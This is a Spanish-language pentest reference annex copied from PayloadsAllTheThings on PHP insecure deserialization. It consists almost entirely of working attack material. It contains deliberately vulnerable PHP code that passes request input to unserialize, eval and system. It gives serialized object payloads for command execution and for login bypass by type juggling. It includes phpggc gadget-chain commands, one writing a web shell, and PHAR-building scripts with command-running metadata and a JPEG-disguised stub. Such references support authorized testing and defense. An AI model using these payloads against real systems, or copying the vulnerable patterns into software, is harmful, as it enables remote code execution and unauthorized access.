# Deserialización insegura: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Insecure Deserialization/PHP.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Insecure%20Deserialization/PHP.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. PHP Deserialization / General Concept

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

```php
    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
```

```php
    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
```

### Variantes presentes en tablas o texto del apartado

```text
__wakeup()
__destruct()
__toString()
Wrapper Phar://
```

## 2. Autenticación Evasión / Type Juggling

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

### Variantes presentes en tablas o texto del apartado

```text
true == "str"
```

## 3. PHP Deserialization / Object Inyección

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 4. PHP Deserialization / Finding and Usando Gadgets

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

### Variantes presentes en tablas o texto del apartado

```text
unserialize()
__construct()
__destruct()
__call()
__callStatic()
__get()
__set()
__isset()
__unset()
__sleep()
__wakeup()
__serialize()
__unserialize()
__toString()
__invoke()
__set_state()
__clone()
__debugInfo()
__call(string $name, array $arguments)
$name
$arguments
__callStatic(string $name, array $arguments)
__get(string $name)
__set(string $name, mixed $value)
__isset(string $name)
isset()
empty()
__unset(string $name)
unset()
serialize()
__unserialize(array $data)
__set_state(array $properties)
var_export()
var_dump()
```

## 5. PHP Deserialization / Deserialización PHAR

```php
    <?php
    class PDFGenerator { }

    //Create a new instance of the Dummy class and modify its property
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; //our payload

    // Delete any existing PHAR archive with that name
    @unlink("poc.phar");

    // Create a new archive
    $poc = new Phar("poc.phar");

    // Add all write operations to a buffer, without modifying the archive on disk
    $poc->startBuffering();

    // Set the stub
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* Add a new file in the archive with "text" as its content*/
    $poc["file"] = "text";
    // Add the dummy object to the metadata. This will be serialized
    $poc->setMetadata($dummy);
    // Stop buffering and write changes to disk
    $poc->stopBuffering();
    ?>
```

```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // create new Phar
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // add object of any class as meta data
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
```

### Variantes presentes en tablas o texto del apartado

```text
phar://
file_get_contents("phar://./archives/app.phar")
__HALT_COMPILER();
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
